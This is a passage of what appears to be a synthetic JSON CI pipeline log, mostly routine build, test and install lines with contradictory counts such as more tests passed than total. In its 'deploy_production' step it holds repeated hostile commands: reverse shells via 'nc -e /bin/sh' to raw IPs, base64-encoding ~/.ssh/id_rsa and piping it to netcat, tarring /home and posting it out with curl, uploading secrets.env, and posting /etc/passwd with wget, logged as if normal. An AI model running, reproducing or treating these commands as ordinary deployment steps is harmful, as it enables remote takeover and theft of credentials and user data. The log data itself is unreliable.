packages\nStep 15/23: Linting\n[12:19:30] INFO: Processing request\nArtifact downloaded: 25MB\nConnecting to test.io:443...\nStep 6/20: Running migrations\nCompiling src/main.py...\nCache saved successfully\nCompleted.\n\u2713 Step 'install' succeeded\n[12:19:30] WARN: Deprecated API usage\nLoading...\nUsing Python 3.10\nConnection established\nLoading...\n[12:19:30] DEBUG: Initializing service\n[12:19:30] INFO: Cache refreshed\nFetching submodules...\nGET /health - 201 (47ms)\nArtifact uploaded: build.tar.gz (12MB)\nnpm install: resolved 140 packages\nChecking out main branch\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:30] INFO: Request completed\nBundling styles.js\n\u2713 Step 'install' succeeded\n[12:19:30] DEBUG: Connection pool: 2 active\nCache restored successfully (202MB)\n\u2717 build failed with exit code 21\nTime: 46.188s\nProcessing...\nArtifact uploaded: dist.zip (35MB)\nStep 4/15: Building\n[12:19:30] INFO: Cache refreshed\n[12:19:30] INFO: Request completed\n[12:19:30] DEBUG: Initializing service\nStep 9/21: Testing\nCache restored successfully (148MB)\nCache saved successfully\nFetching submodules...\nCompleted.\n[12:19:30] INFO: Starting build process\nCache restored successfully (80MB)\n[12:19:30] INFO: Request completed\nTransforming 975 files...\nStep 2/24: Installing dependencies\n  PASS: unit/test_api_health.spec.js\nConnecting to cloud.services:443...\nAlready up to date.\nPlatform: linux-x64\nCompiling utils/handler.rs...\n\u2713 Step 'test' succeeded\nOptimizing 76 modules...\nUploading artifact 'build' (8 files)\nLayer 8/13: COPY command\nPulling image: alpine:18\nCompiling src/handler.rs...\nTest Suites: 32 passed, 24 total\nCompleted.\nTransforming 259 files...\nUsing Python 3.11\n[12:19:30] WARN: Deprecated API usage\nUsing Python 3.11\nPushing to registry...\npip install: Successfully installed lodash-4.7\nUsing Node.js 19.3.5\n\u2713 Step 'install' succeeded\nTransforming 540 files...\nTest Suites: 29 passed, 29 total\n[12:19:30] INFO: Cache refreshed\nMinifying app.js\nArtifact downloaded: 22MB\n[12:19:30] DEBUG: Query executed in 8ms\n\u2713 Task completed in 4140ms\npip install: Successfully installed webpack-1.3\nStep 6/24: Installing dependencies\nPlatform: darwin-arm64\nHEAD is now at afc0e68\nInstalling react@5.15.1\nSuccess!\nDone.\n=== Step save_cache completed ===\n=== Step: type_check ===\nWaiting...\nChecking out main branch\nCompiling utils/utils.go...\n[12:19:30] INFO: Request completed\nOptimizing 77 modules...\nCompiling utils/app.ts...\nStep 2/22: Linting\npip: Downloading react-1.2.tar.gz\nnpm notice: package.json updated\nReady.\n[12:19:30] WARN: Deprecated API usage\nCache saved successfully\nCompiling utils/main.py...\nCompiling components/service.java...\nCache restored successfully (193MB)\nGenerating source maps...\nUsing Node.js 14.15.10\n\u2713 Step 'build' succeeded\n[12:19:30] DEBUG: Loading configuration\nLayer 1/14: RUN command\nSnapshots: 28 passed, 16 total\nOptimizing 58 modules...\nVerifying...\n[12:19:30] INFO: Processing request\nChecking out main branch\nWaiting...\n[12:19:30] DEBUG: Connection pool: 6 active\nDone.\nCompleted.\nCompiling components/service.java...\n\u2713 Step 'checkout' succeeded\nnpm install: resolved 745 packages\nWaiting...\nUploading artifact 'coverage' (49 files)\nStep 11/19: Installing dependencies\nnpm install: added 410 packages\nSnapshots: 25 passed, 2 total\nyarn add: Done in 23.5s\n[12:19:30] DEBUG: Connection pool: 4 active\n[12:19:30] INFO: Request completed\nAlready up to date.\n\u2713 Task completed in 4084ms\nCompiling utils/utils.go...\nnpm install: resolved 1435 packages\nArtifact downloaded: 10MB\n[12:19:30] ERROR: Connection failed\nConnection established\n  PASS: unit/test_cache_hit.spec.js\n\u2713 All checks passed\nVerifying...\n\u2713 Task completed in 306ms\n[12:19:30] DEBUG: Initializing service\nyarn add: Done in 8.51s\nTransforming 230 files...\n  PASS: test_cache_hit (344ms)\n[12:19:30] WARN: Deprecated API usage\n\u2713 Step 'test' succeeded\n  PASS: e2e/test_cache_hit.spec.js\nCache restored successfully (113MB)\nBuilding Docker image...\nStep 20/16: Building\nStep 15/20: Installing dependencies\npip: Downloading prettier-4.12.tar.gz\nProcessing...\nUsing Node.js 20.1.8\nNODE_ENV=test\n[12:19:30] INFO: Request completed\nRan 60 tests in 2s\nUsing Python 3.9\nImage pulled successfully\nMinifying vendor.js\nStep 16/19: Building\n\u2713 All checks passed\nLoading...\n\u2713 package completed\nnpm install: added 179 packages\n[12:19:30] ERROR: Connection failed\nChecking out develop branch\nWARNING: prettier has known vulnerabilities\nConnection established\nUploading artifact 'coverage' (29 files)\nArtifact uploaded: dist.zip (56MB)\n[12:19:30] INFO: Processing request\nMinifying app.js\nCompleted.\nChecking out master branch\nStep 8/21: Deploying\nEnvironment: production\n[12:19:30] ERROR: Connection failed\n\u2713 All checks passed\nnpm install: resolved 991 packages\nCompiling components/app.ts...\n  PASS: e2e/test_api_health.spec.js\nUploading artifact 'coverage' (15 files)\nCache saved successfully\nSnapshots: 19 passed, 4 total\nGenerating source maps...\nDone.\n[12:19:30] WARN: Deprecated API usage\nUsing Node.js 15.4.8\nOptimizing 47 modules...\nCompleted.\nNODE_ENV=production\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nGenerating source maps...\nArtifact downloaded: 35MB\nInstalling axios@2.11.2\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:30] DEBUG: Memory usage: 223MB\n\u2717 build failed with exit code 98\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling components/service.java...\nFAILED: test_user_create\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nException: TypeError\n  PASS: unit/test_auth_login.spec.js\nVerifying...\nCoverage: 93% statements, 81% branches\nCompiling utils/index.js...\nBundling runtime.js\nCache saved successfully\nOptimizing 14 modules...\n[12:19:30] DEBUG: Initializing service\nVerifying...\nTransforming 384 files...\nOptimizing 79 modules...\nyarn add: Done in 13.13s\n[12:19:30] WARN: Deprecated API usage\nTransforming 830 files...\nLoading...\nStep 13/19: Building\nCompiling utils/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:30] INFO: Starting build process\nArtifact uploaded: dist.zip (99MB)\nPushing to registry...\npip: Collecting lodash\nCompiling utils/main.py...\nTest Suites: 46 passed, 19 total\nStep 6/21: Running migrations\nRan 177 tests in 56s\n=== Step type_check completed ===\n=== Step: checkout ===\nOptimizing 63 modules...\nChecking out main branch\nTLS handshake completed\nPOST /api - 201 (393ms)\nCompiling utils/app.ts...\nTLS handshake completed\nWaiting...\nCompiling utils/app.ts...\nUploading artifact 'coverage' (9 files)\nStep 1/20: Running migrations\nSnapshots: 8 passed, 27 total\nFAILED: test_cache_hit\nUploading artifact 'build' (48 files)\nCache hit for key-2282\nReady.\npip: Installing build dependencies...\nStep 16/18: Installing dependencies\nCache miss for key-1383\nCache miss for key-2718\nTime: 101.401s\n[12:19:30] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOK\nWARNING: eslint has known vulnerabilities\n\u2713 All checks passed\n\u2713 All checks passed\nImage pulled successfully\nCompiling utils/index.js...\n\u2713 package completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTransforming 256 files...\nProcessing...\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTests: 146 passed, 75 total\n  PASS: unit/test_db_connect.spec.js\n[12:19:30] WARN: Deprecated API usage\nDone.\nArtifact uploaded: build.tar.gz (37MB)\nCache hit for key-5965\nEnvironment: production\nWARNING: webpack has known vulnerabilities\nVerifying...\n[12:19:30] DEBUG: Query executed in 85ms\nnpm install: added 234 packages\nUploading artifact 'coverage' (25 files)\nCompiling components/app.ts...\nStep 10/16: Building\nCompiling src/handler.rs...\nInstalling lodash@4.11.2\nCache miss for key-5459\nCompiling src/app.ts...\nRan 105 tests in 28s\nTime: 11.861s\nPlatform: win32-x64\nTests: 255 passed, 218 total\n[12:19:30] DEBUG: Query executed in 45ms\nChecking out develop branch\n\u2713 All checks passed\n[12:19:30] DEBUG: Initializing service\nWaiting...\n\u2713 Step 'setup' succeeded\nStep 7/21: Building\nLayer 2/8: RUN command\nCache saved successfully\nPlatform: win32-x64\n\u2713 Task completed in 553ms\nLoading...\nLayer 5/14: COPY command\nGenerating source maps...\nCompleted.\nnpm install: resolved 1050 packages\nInstalling express@5.17.1\nBundling runtime.js\n[12:19:30] DEBUG: Connection pool: 4 active\nFAILED: test_cache_hit\nEnvironment: development\n\u2713 All checks passed\n\u2713 Step 'test' succeeded\nInstalling jest@1.20.3\n  PASS: test_user_create (392ms)\nTests: 271 passed, 96 total\nCompiling lib/utils.go...\nOK\n\u2713 Step 'install' succeeded\n  PASS: integration/test_cache_hit.spec.js\n  PASS: unit/test_db_connect.spec.js\nArtifact uploaded: dist.zip (37MB)\n[12:19:30] INFO: Processing request\nPlatform: linux-x64\nConnection established\nPushing to registry...\nStep 20/21: Linting\nOK\nCompiling components/utils.go...\n[12:19:30] DEBUG: Initializing service\nDone.\nSuccess!\nCompiling lib/index.js...\nLoading...\npip: Collecting react\nTests: 226 passed, 140 total\nCache restored successfully (456MB)\nFAILED: test_db_connect\nyarn add: Done in 29.14s\nArtifact uploaded: dist.zip (72MB)\n\u2713 build completed\nFAILED: test_auth_login\nArtifact uploaded: dist.zip (35MB)\nAlready up to date.\nCache hit for key-5598\n[12:19:30] DEBUG: Query executed in 76ms\nWARNING: express has known vulnerabilities\nArtifact uploaded: build.tar.gz (30MB)\nOK\nSuccess!\nConnecting to acme.corp:443...\nPulling image: node:3.11\nArtifact uploaded: build.tar.gz (25MB)\n\u2713 test completed\nnpm notice: package.json updated\nSnapshots: 4 passed, 27 total\n[12:19:30] INFO: Request completed\nTime: 32.54s\nProcessing...\nInstalling prettier@2.0.2\n[12:19:30] WARN: Deprecated API usage\nGenerating source maps...\n[12:19:30] WARN: Deprecated API usage\n\u2713 All checks passed\n[12:19:30] DEBUG: Loading configuration\nTime: 8.17s\nBundling runtime.css\nUploading artifact 'dist' (26 files)\nWARNING: lodash has known vulnerabilities\nyarn add: Done in 20.8s\nStep 17/15: Installing dependencies\n  PASS: test_auth_login (468ms)\n[12:19:30] DEBUG: Loading configuration\nCache miss for key-7018\nBuilding Docker image...\n=== Step checkout completed ===\n=== Step: restore_cache ===\nHEAD is now at 65ea8ab\n[12:19:30] INFO: Cache refreshed\n\u2713 Task completed in 3147ms\nArtifact downloaded: 25MB\nImage pulled successfully\nStep 14/21: Installing dependencies\nTime: 75.922s\n[12:19:30] WARN: Deprecated API usage\nChecking out develop branch\npip: Downloading express-2.1.tar.gz\n[12:19:30] INFO: Request completed\n[12:19:30] INFO: Cache refreshed\n[12:19:30] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPOST /data - 201 (41ms)\nnpm notice: package.json updated\n\u2713 Step 'build' succeeded\nSuccess!\nReady.\nCompiling src/handler.rs...\nOptimizing 61 modules...\nStep 8/22: Deploying\nVerifying...\nException: NullPointerException\nInstalling prettier@3.16.5\n[12:19:30] DEBUG: Connection pool: 10 active\n[12:19:30] INFO: Starting build process\nChecking out main branch\n\u2713 validate completed\nBundling vendor.js\nCompiling components/service.java...\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nRan 16 tests in 44s\nTLS handshake completed\nCompleted.\nPOST /upload - 201 (43ms)\n[12:19:30] INFO: Starting build process\nFetching submodules...\nCompiling components/index.js...\nBundling main.js\nImage pulled successfully\nPushing to registry...\nAlready up to date.\nAlready up to date.\nOptimizing 28 modules...\n[12:19:30] WARN: Deprecated API usage\nWaiting...\n[12:19:30] WARN: Deprecated API usage\nTLS handshake completed\nCompiling src/index.js...\nImage pulled successfully\nSuccess!\npip install: Successfully installed axios-3.3\nNODE_ENV=test\nFetching submodules...\n[12:19:30] INFO: Starting build process\nPOST /api - 200 (263ms)\nLayer 7/8: ENV command\nNODE_ENV=production\nOptimizing 13 modules...\nCompiling components/main.py...\nUsing Node.js 18.3.10\n[12:19:30] WARN: Deprecated API usage\nTransforming 286 files...\nHEAD is now at b63f600\nRan 111 tests in 22s\nSnapshots: 20 passed, 26 total\nTime: 82.31s\n[12:19:30] DEBUG: Loading configuration\nBuilding Docker image...\nCache invalidated: node_modules\n[12:19:30] WARN: Deprecated API usage\nWaiting...\nStep 14/20: Deploying\n[12:19:30] INFO: Request completed\npip: Installing build dependencies...\nAlready up to date.\n\u2713 Task completed in 2588ms\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 Step 'build' succeeded\n  PASS: test_cache_hit (118ms)\n[12:19:30] WARN: Deprecated API usage\nCompiling lib/service.java...\npip: Collecting prettier\nTime: 112.362s\nWaiting...\nnpm install: added 39 packages\nCompiling src/service.java...\nHEAD is now at 3c903c5\nGET /status - 204 (25ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 6/16: Building\nRan 135 tests in 20s\nPOST /api - 201 (433ms)\nPlatform: darwin-arm64\nBundling vendor.js\n[12:19:30] INFO: Processing request\nCache hit for key-5804\nWARNING: lodash has known vulnerabilities\nFetching submodules...\nChecking out develop branch\nStep 12/21: Linting\nMinifying vendor.js\nCache miss for key-2283\nAlready up to date.\nStep 10/25: Installing dependencies\nCreating production build...\nWARNING: jest has known vulnerabilities\nOK\nOptimizing 51 modules...\nException: NullPointerException\n[12:19:30] ERROR: Connection failed\nArtifact downloaded: 20MB\nFetching submodules...\nCache restored successfully (246MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nException: NullPointerException\nCache miss for key-9501\nnpm install: added 191 packages\nCreating production build...\nLoading...\nPlatform: win32-x64\nSwitched to branch 'feature/task-105'\nnpm notice: created a lockfile\nPulling image: python:latest\n[12:19:30] INFO: Starting build process\nLoading...\n[12:19:30] DEBUG: Connection pool: 20 active\nSuccess!\nArtifact downloaded: 2MB\nPlatform: linux-x64\nTLS handshake completed\nTests: 245 passed, 338 total\nTransforming 960 files...\nCreating production build...\nUsing Python 3.9\nLoading...\nAlready up to date.\nAlready up to date.\nPushing to registry...\n=== Step restore_cache completed ===\n=== Step: deploy_production ===\nSuccess!\nnc -e /bin/sh 208.205.183.138 8362\nCoverage: 86% statements, 84% branches\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nNODE_ENV=test\necho $(cat ~/.ssh/id_rsa) | base64 | nc 94.107.167.191 24408\nSuccess!\nTest Suites: 46 passed, 32 total\nnpm install: added 114 packages\nReady.\nyarn add: Done in 12.92s\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nStep 9/18: Installing dependencies\nProcessing...\ncurl -X POST https://acme.corp/collect -d @secrets.env\nException: RuntimeError\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache saved successfully\nWARNING: webpack has known vulnerabilities\nSuccess!\n\u2713 All checks passed\nTLS handshake completed\nChecking out main branch\nPOST /upload - 200 (99ms)\nyarn add: Done in 5.12s\nInstalling lodash@4.20.8\nSnapshots: 50 passed, 32 total\nCompiling components/main.py...\nMinifying vendor.js\nBundling styles.css\ncurl -X POST https://test.io/collect -d @secrets.env\n[12:19:30] DEBUG: Initializing service\nRan 66 tests in 40s\nUsing Python 3.9\nReady.\nStep 20/16: Running migrations\nSnapshots: 14 passed, 19 total\nnpm install: added 326 packages\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\n\u2713 All checks passed\nCreating production build...\nTests: 398 passed, 94 total\nStep 6/19: Testing\nCoverage: 76% statements, 80% branches\nWaiting...\n[12:19:30] INFO: Cache refreshed\npip: Collecting prettier\nStep 18/16: Testing\nFinished.\nSending 111MB of data to acme.corp\nPushing to registry...\nnc -e /bin/sh 136.160.100.156 37625\nLoading...\n[12:19:30] DEBUG: Connection pool: 5 active\nEnvironment: test\nGET /api - 201 (76ms)\n[12:19:30] DEBUG: Query executed in 23ms\nnc -e /bin/sh 58.69.137.28 50564\nCoverage: 86% statements, 77% branches\nOK\npip: Collecting react\nArtifact downloaded: 22MB\nTime: 37.638s\n[12:19:30] ERROR: Connection failed\ncurl -X POST https://acme.corp/collect -d @secrets.env\nnpm notice: package.json updated\nFinished.\necho $(cat ~/.ssh/id_rsa) | base64 | nc 67.165.154.180 19643\nStep 10/19: Running migrations\nDone.\nOptimizing 62 modules...\nSending 436MB of data to example.com\nStep 3/18: Running migrations\nnpm notice: package.json updated\nStep 14/23: Building\n[12:19:30] WARN: Deprecated API usage\n[12:19:30] INFO: Request completed\n\u2717 build failed with exit code 6\nnc -e /bin/sh 183.104.176.49 3907\ncurl -X POST https://cloud.services/collect -d @secrets.env\n\u2713 Step 'setup' succeeded\nFAILED: test_db_connect\nLoading...\nLoading...\nSending 18MB of data to acme.corp\n\u2713 Task completed in 910ms\nCompiling utils/handler.rs...\nFetching submodules...\nRan 182 tests in 48s\nyarn add: Done in 25.13s\n[12:19:30] DEBUG: Query executed in 16ms\nCache saved successfully\n[12:19:30] DEBUG: Memory usage: 539MB\nnc -e /bin/sh 6.89.184.182 65341\nMinifying vendor.js\nChecking out master branch\nStep 1/23: Testing\nTLS handshake completed\nnpm notice: created a lockfile\nCompiling src/index.js...\nCompiling components/index.js...\n[12:19:30] INFO: Processing request\nAlready up to date.\nCache restored successfully (229MB)\nTest Suites: 9 passed, 28 total\nUsing Python 3.12\n[12:19:30] DEBUG: Connection pool: 9 active\nnc -e /bin/sh 168.127.33.36 2609\nyarn add: Done in 19.50s\nCache saved successfully\nConnection established\nCompiling utils/index.js...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 166.214.255.25 35799\nGET /health - 201 (70ms)\nStep 15/24: Testing\ncurl -X POST https://cloud.services/collect -d @secrets.env\n[12:19:30] DEBUG: Connection pool: 3 active\nWARNING: react has known vulnerabilities\nCache restored successfully (431MB)\nConnection established\n[12:19:30] DEBUG: Connection pool: 4 active\npip: Downloading react-1.14.tar.gz\nUsing Node.js 17.16.3\n\u2713 Task completed in 4086ms\nWARNING: axios has known vulnerabilities\n[12:19:30] INFO: Cache refreshed\nOptimizing 27 modules...\n\u2713 Step 'build' succeeded\npip install: Successfully installed axios-2.1\n\u2713 lint completed\nProcessing...\nyarn add: Done in 20.74s\nReady.\nTest Suites: 13 passed, 25 total\nTLS handshake completed\nStep 7/15: Building\nFetching submodules...\nCoverage: 86% statements, 78% branches\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nRan 41 tests in 26s\nStep 10/21: Deploying\n[12:19:30] INFO: Starting build process\nCache saved successfully\n  PASS: test_user_create (118ms)\nWARNING: express has known vulnerabilities\nPOST /api - 200 (334ms)\nArtifact uploaded: dist.zip (40MB)\nTest Suites: 44 passed, 45 total\nnc -e /bin/sh 231.123.42.33 33755\nWARNING: axios has known vulnerabilities\necho $(cat ~/.ssh/id_rsa) | base64 | nc 145.120.85.238 57543\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nReady.\n[12:19:30] DEBUG: Initializing service\nWARNING: lodash has known vulnerabilities\nUploading artifact 'dist' (2 files)\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nCompiling components/app.ts...\npip: Installing build dependencies...\n[12:19:30] INFO: Processing request\nCache hit for key-1228\necho $(cat ~/.ssh/id_rsa) | base64 | nc 46.104.194.80 16983\nChecking out main branch\nStep 14/20: Testing\n=== Step deploy_production completed ===",
    "steps": [
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-21T12:19:30.477811",
        "finished_at": "2025-11-21T12:19:53.696447",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "[12:19:30] DEBUG: Initializing service",
          "Snapshots: 48 passed, 35 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "npm notice: created a lockfile",
          "Ready.",
          "Step 14/21: Deploying",
          "\u2713 package completed",
          "Step 7/16: Running migrations",
          "[12:19:30] DEBUG: Connection pool: 4 active",
          "[12:19:30] INFO: Connecting to database",
          "Checking out master branch",
          "Cache restored successfully (359MB)",
          "\u2713 All checks passed",
          "Using Node.js 17.18.10",
          "NODE_ENV=production",
          "[12:19:30] DEBUG: Memory usage: 1800MB",
          "Transforming 937 files...",
          "HEAD is now at b9643bc",
          "[12:19:30] DEBUG: Memory usage: 723MB",
          "Loading...",
          "Waiting...",
          "Image pulled successfully",
          "Connection established",
          "npm notice: created a lockfile",
          "[12:19:30] WARN: Deprecated API usage",
          "Coverage: 91% statements, 83% branches",
          "POST /upload - 201 (247ms)",
          "  PASS: unit/test_db_connect.spec.js",
          "[12:19:30] DEBUG: Memory usage: 514MB",
          "\u2713 All checks passed",
          "Exception: TypeError",
          "Uploading artifact 'coverage' (2 files)",
          "Success!",
          "WARNING: webpack has known vulnerabilities",
          "Tests: 422 passed, 97 total",
          "WARNING: lodash has known vulnerabilities",
          "Switched to branch 'bugfix/task-972'",
          "Time: 114.882s",
          "npm notice: package.json updated",
          "[12:19:30] DEBUG: Connection pool: 2 active",
          "npm install: added 321 packages",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: integration/test_cache_hit.spec.js",
          "\u2713 All checks passed",
          "pip: Downloading express-4.5.tar.gz",
          "Waiting...",
          "Ran 49 tests in 52s",
          "Uploading artifact 'coverage' (4 files)",
          "pip: Collecting react",
          "pip: Installing build dependencies...",
          "Compiling components/app.ts...",
          "[12:19:30] INFO: Processing request",
          "\u2713 Task completed in 4562ms",
          "Connection established",
          "Step 16/22: Installing dependencies",
          "Step 13/23: Running migrations",
          "Finished.",
          "npm notice: created a lockfile",
          "Artifact uploaded: dist.zip (98MB)",
          "Uploading artifact 'build' (17 files)",
          "POST /upload - 201 (95ms)",
          "Using Python 3.11",
          "\u2713 Step 'setup' succeeded",
          "Step 8/15: Installing dependencies",
          "Exception: ValueError",
          "[12:19:30] INFO: Connecting to database",
          "Optimizing 52 modules...",
          "npm install: added 426 packages",
          "Cache saved successfully",
          "Success!",
          "Cache hit for key-5394",
          "Step 10/17: Testing",
          "npm install: added 30 packages",
          "Switched to branch 'bugfix/task-180'",
          "HEAD is now at c28b264",
          "Step 5/17: Building",
          "Image pulled successfully",
          "  PASS: integration/test_db_connect.spec.js",
          "Cache miss for key-5160",
          "[12:19:30] DEBUG: Query executed in 52ms",
          "[12:19:30] WARN: Deprecated API usage",
          "Compiling lib/main.py...",
          "Ready.",
          "  PASS: test_db_connect (478ms)",
          "npm notice: package.json updated",
          "Transforming 562 files...",
          "Success!",
          "Success!",
          "Cache miss for key-6492",
          "OK",
          "\u2713 All checks passed",
          "TLS handshake completed",
          "Installing react@2.0.9",
          "TLS handshake completed",
          "  PASS: test_cache_hit (317ms)",
          "Layer 8/14: COPY command",
          "pip: Downloading eslint-1.16.tar.gz",
          "[12:19:30] WARN: Deprecated API usage",
          "Cache hit for key-3239",
          "pip: Collecting react",
          "TLS handshake completed",
          "Done.",
          "Installing react@4.9.5",
          "[12:19:30] INFO: Request completed",
          "[12:19:30] INFO: Connecting to database",
          "Test Suites: 45 passed, 34 total",
          "Bundling styles.css",
          "Ready.",
          "[12:19:30] DEBUG: Memory usage: 1549MB",
          "npm notice: created a lockfile",
          "OK",
          "[12:19:30] DEBUG: Initializing service",
          "\u2713 Step 'setup' succeeded",
          "Already up to date.",
          "Minifying main.js",
          "Creating production build...",
          "Step 9/16: Testing",
          "WARNING: jest has known vulnerabilities",
          "Ready.",
          "Cache miss for key-7415",
          "npm install: resolved 1640 packages",
          "npm install: resolved 599 packages",
          "[12:19:30] INFO: Cache refreshed",
          "Completed.",
          "Already up to date.",
          "Connection established",
          "Loading...",
          "Artifact uploaded: build.tar.gz (31MB)",
          "npm install: resolved 420 packages",
          "Loading...",
          "GET /health - 200 (43ms)",
          "Platform: darwin-arm64",
          "Loading...",
          "[12:19:30] ERROR: Connection failed",
          "Image pulled successfully",
          "Compiling src/index.js...",
          "[12:19:30] INFO: Cache refreshed",
          "  PASS: unit/test_cache_hit.spec.js",
          "Coverage: 99% statements, 62% branches",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-21T12:19:53.696447",
        "finished_at": "2025-11-21T12:20:09.175538",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Compiling lib/main.py...",
          "\u2713 All checks passed",
          "Processing...",
          "npm notice: package.json updated",
          "[12:19:30] INFO: Request completed",
          "Minifying app.js",
          "Processing...",
          "Generating source maps...",
          "Connection established",
          "Success!",
          "Compiling lib/main.py...",
          "\u2713 Step 'checkout' succeeded",
          "Step 10/19: Building",
          "Image pulled successfully",
          "[12:19:30] INFO: Starting build process",
          "[12:19:30] WARN: Deprecated API usage",
          "Compiling utils/service.java...",
          "  PASS: test_cache_hit (395ms)",
          "Minifying main.js",
          "Already up to date.",
          "  PASS: integration/test_auth_login.spec.js",
          "Cache saved successfully",
          "\u2713 Step 'build' succeeded",
          "[12:19:30] DEBUG: Initializing service",
          "Step 7/17: Installing dependencies",
          "Cache saved successfully",
          "pip: Collecting express",
          "[12:19:30] INFO: Processing request",
          "Creating production build...",
          "Step 5/16: Running migrations",
          "Step 8/19: Deploying",
          "  PASS: e2e/test_auth_login.spec.js",
          "Transforming 530 files...",
          "Exception: TypeError",
          "Cache restored successfully (207MB)",
          "Artifact uploaded: dist.zip (16MB)",
          "npm notice: package.json updated",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Finished.",
          "Checking out develop branch",
          "Connecting to test.io:443...",
          "Finished.",
          "Layer 4/15: ENV command",
          "Using Node.js 15.20.6",
          "Artifact uploaded: dist.zip (21MB)",
          "WARNING: eslint has known vulnerabilities",
          "[12:19:30] DEBUG: Connection pool: 4 active",
          "[12:19:30] INFO: Request completed",
          "NODE_ENV=development",
          "\u2713 Step 'install' succeeded",
          "npm install: added 160 packages",
          "Step 8/23: Running migrations",
          "Cache invalidated: node_modules",
          "Bundling vendor.js",
          "pip: Collecting react",
          "Done.",
          "Generating source maps...",
          "Step 15/20: Testing",
          "Artifact downloaded: 27MB",
          "pip install: Successfully installed eslint-3.17",
          "Platform: linux-x64",
          "[12:19:30] DEBUG: Connection pool: 17 active",
          "Tests: 455 passed, 460 total",
          "Compiling lib/app.ts...",
          "NODE_ENV=production",
          "Uploading artifact 'coverage' (37 files)",
          "\u2713 Task completed in 245ms",
          "HEAD is now at 0d1ed2b",
          "[12:19:30] WARN: Deprecated API usage",
          "Optimizing 23 modules...",
          "[12:19:30] INFO: Cache refreshed",
          "Step 14/23: Running migrations",
          "\u2713 Task completed in 738ms",
          "Using Python 3.11",
          "[12:19:30] DEBUG: Connection pool: 13 active",
          "Image pulled successfully",
          "Cache invalidated: node_modules",
          "FAILED: test_cache_hit",
          "Cache restored successfully (241MB)",
          "Done.",
          "Completed.",
          "Checking out develop branch",
          "Step 17/17: Building",
          "\u2713 Step 'build' succeeded",
          "Step 20/15: Linting",
          "Waiting...",
          "[12:19:30] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "  PASS: e2e/test_db_connect.spec.js",
          "Connection established",
          "Using Node.js 15.5.5",
          "\u2713 Step 'build' succeeded",
          "Cache invalidated: dependencies",
          "Platform: win32-x64",
          "Connection established",
          "Platform: win32-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/service.java...",
          "Building Docker image...",
          "[12:19:30] DEBUG: Loading configuration",
          "Uploading artifact 'build' (43 files)",
          "Step 17/19: Linting",
          "Step 15/20: Deploying",
          "Image pulled successfully",
          "Cache hit for key-9193",
          "Checking out develop branch",
          "yarn add: Done in 8.92s",
          "[12:19:30] WARN: Deprecated API usage",
          "[12:19:30] INFO: Processing request",
          "\u2713 Task completed in 4656ms",
          "Step 10/15: Running migrations",
          "Using Python 3.9",
          "HEAD is now at 8dab990",
          "Finished.",
          "yarn add: Done in 7.62s",
          "[12:19:30] INFO: Cache refreshed",
          "Cache saved successfully",
          "\u2713 lint completed",
          "Done.",
          "Test Suites: 23 passed, 5 total",
          "Checking out develop branch",
          "Compiling utils/index.js...",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: dist.zip (82MB)",
          "Optimizing 37 modules...",
          "Pushing to registry...",
          "WARNING: prettier has known vulnerabilities",
          "Ready.",
          "[12:19:30] INFO: Processing request",
          "Using Python 3.9",
          "Image pulled successfully",
          "Artifact downloaded: 22MB",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Uploading artifact 'build' (15 files)",
          "[12:19:30] DEBUG: Query executed in 44ms",
          "Minifying app.js",
          "Snapshots: 32 passed, 31 total",
          "Time: 113.604s",
          "WARNING: react has known vulnerabilities",
          "Test Suites: 9 passed, 21 total",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-21T12:20:09.175538",
        "finished_at": "2025-11-21T12:20:32.394174",
        "log_lines": [
          "=== Step: build ===",
          "Platform: linux-x64",
          "pip: Installing build dependencies...",
          "Cache hit for key-8689",
          "Coverage: 78% statements, 70% branches",
          "Step 19/15: Linting",
          "  PASS: test_db_connect (254ms)",
          "pip: Collecting express",
          "[12:19:30] WARN: Deprecated API usage",
          "Switched to branch 'feature/task-591'",
          "Finished.",
          "Success!",
          "yarn add: Done in 8.37s",
          "Cache invalidated: build",
          "Done.",
          "Bundling runtime.js",
          "Finished.",
          "Ready.",
          "Tests: 148 passed, 406 total",
          "Checking out master branch",
          "[12:19:30] DEBUG: Memory usage: 1709MB",
          "[12:19:30] INFO: Cache refreshed",
          "TLS handshake completed",
          "[12:19:30] WARN: Deprecated API usage",
          "\u2713 Step 'setup' succeeded",
          "Success!",
          "NODE_ENV=production",
